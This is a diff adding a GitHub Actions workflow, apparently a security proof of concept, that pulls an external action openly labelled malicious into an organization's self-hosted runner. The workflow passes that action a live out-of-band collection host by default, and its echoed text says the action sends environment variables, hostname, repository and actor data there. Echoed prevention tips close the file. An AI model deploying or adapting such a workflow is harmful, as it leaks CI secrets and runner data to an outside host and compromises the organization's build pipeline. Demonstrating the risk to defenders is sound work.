@@ -1,0 +1,58 @@
+name: Organization Attack Demonstration
+
+# This workflow demonstrates how malicious actions from external repositories
+# can be loaded into organization workflows to exfiltrate data
+
+on:
+  workflow_dispatch:
+    inputs:
+      target_endpoint:
+        description: 'Target endpoint for data exfiltration'
+        required: true
+        default: 'pxq5e1pis82o7p125z9urcjyqpwgk68v.oastify.com'
+
+jobs:
+  external-malicious-action:
+    runs-on: af-slim-prd  # Using AppsFlyer runner for org security
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v4
+      
+      - name: Use External Malicious Action
+        uses: sagiDinar/github-actions-security-poc/malicious-action-demo@master
+        with:
+          target_endpoint: ${{ github.event.inputs.target_endpoint }}
+          data_type: 'all'
+      
+      - name: Demonstrate Attack Success
+        run: |
+          echo "=== ATTACK DEMONSTRATION SUCCESSFUL ==="
+          echo "This workflow successfully loaded a malicious action from:"
+          echo "sagiDinar/github-actions-security-poc/malicious-action-demo@master"
+          echo ""
+          echo "The malicious action has exfiltrated:"
+          echo "- Runner hostname information"
+          echo "- Environment variables"
+          echo "- Repository metadata"
+          echo "- Actor information"
+          echo ""
+          echo "Target endpoint: ${{ github.event.inputs.target_endpoint }}"
+          echo "Check your OAST endpoint for received data!"
+          echo ""
+          echo "This demonstrates how external malicious actions can:"
+          echo "1. Be loaded into organization workflows"
+          echo "2. Access sensitive runner information"
+          echo "3. Exfiltrate data to external endpoints"
+          echo "4. Bypass security controls"
+      
+      - name: Show Prevention Methods
+        run: |
+          echo "=== PREVENTION METHODS ==="
+          echo "To prevent this attack:"
+          echo "1. Block external actions in organization settings"
+          echo "2. Use only approved action repositories"
+          echo "3. Implement action allowlisting policies"
+          echo "4. Pin actions to specific commit SHAs"
+          echo "5. Review all external action usage"
+          echo "6. Monitor for data exfiltration attempts"
+          echo "7. Use self-hosted runners with network restrictions"
